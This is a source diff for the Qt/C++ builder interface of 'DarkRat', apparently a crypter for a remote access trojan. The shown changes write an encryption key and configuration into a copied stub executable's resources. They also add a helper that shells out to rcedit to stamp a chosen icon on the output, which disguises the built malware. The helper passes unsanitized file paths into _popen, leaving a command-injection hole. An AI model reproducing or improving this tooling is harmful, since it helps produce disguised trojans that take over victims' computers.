@@ -47,11 +47,10 @@ DarkRatCrypterUI::DarkRatCrypterUI(QWidget *parent)
 	ui.encryptionkey->setText(QString::fromStdString(random_string(32)));
 //	ui.output->setText("Output.exe");
 	ui.statusBar->hide();
-	QPixmap pix("icons/default.png");
+	QPixmap pix("icons/default.ico");
 	int w = ui.icon->width();
 	int h = ui.icon->height();
 	ui.icon->setPixmap(pix.scaled(w, h, Qt::KeepAspectRatio));
-
 
 }
 char output[MAX_PATH];
@@ -60,10 +59,10 @@ char output[MAX_PATH];
 void DarkRatCrypterUI::on_btn_icon_clicked()
 {
 	QFileDialog dialog(this);
-	dialog.setNameFilter(tr("Images (*.png *.xpm *.jpg)"));
+	dialog.setNameFilter(tr("Icons (.ico)"));
 	dialog.setViewMode(QFileDialog::Detail);
 	QString fileName = QFileDialog::getOpenFileName(this,
-		tr("Open Images"), "icons/", tr("Image Files (*.png *.ico *.icon)"));
+		tr("Open Images"), "icons/", tr("Image Files ( *.ico )"));
 	if (!fileName.isEmpty())
 	{
 		QImage image(fileName);
@@ -73,7 +72,7 @@ void DarkRatCrypterUI::on_btn_icon_clicked()
 
 	}
 
-	ui.icon_path->setText("File: " + fileName);
+	ui.icon_path->setText(fileName);
 }
 
 
@@ -121,6 +120,24 @@ QString base64_encode(QString string) {
 	return ba.toBase64();
 }
 
+std::string exec(const char* cmd) {
+	char buffer[128];
+	std::string result = "";
+	FILE* pipe = _popen(cmd, "r");
+	if (!pipe) throw std::runtime_error("popen() failed!");
+	try {
+		while (fgets(buffer, sizeof buffer, pipe) != NULL) {
+			result += buffer;
+		}
+	}
+	catch (...) {
+		_pclose(pipe);
+		throw;
+	}
+	_pclose(pipe);
+	return result;
+}
+
 
 void DarkRatCrypterUI::on_build_clicked()
 {
@@ -165,11 +182,27 @@ void DarkRatCrypterUI::on_build_clicked()
 	//std::string szCopyPath = "";
 	QFile::copy(QString::fromStdString(szFilePath), QString::fromStdString(szCopyPath));
 	//CopyFile((LPCWSTR)szFilePath.c_str(), (LPCWSTR)szCopyPath.c_str(), FALSE);
-	bool buildSuccess = WriteToResources("spider.exe", 10, (BYTE*)c_write, strlen(c_write));
+	bool buildSuccess = WriteToResources(szCopyPath.c_str(), 10, (BYTE*)c_write, strlen(c_write));
+
+
+	std::string iconPath = "";
+	if (ui.icon_path->text() == "defaulticon") {
+		iconPath = "icons\\default.ico";
+	}
+	else {
+
+		std::string s = ui.icon_path->text().toStdString();
+		std::replace(s.begin(), s.end(), '/', '\\'); // replace all 'x' to 'y'
+
+		iconPath = s;
+	}
+	std::string command = " bin\\rcedit-x86.exe \""+ szCopyPath +"\" --set-icon \""+ iconPath +"\"";
+	exec(command.c_str());
+
 
 	if (buildSuccess) {
 		QMessageBox msgBox1;
-		msgBox1.setText(QString::fromStdString("Build Success"));
+		msgBox1.setText(QString::fromStdString("Build Success "+ szCopyPath));
 		msgBox1.exec();
 	}else {
 		QMessageBox msgBox2;
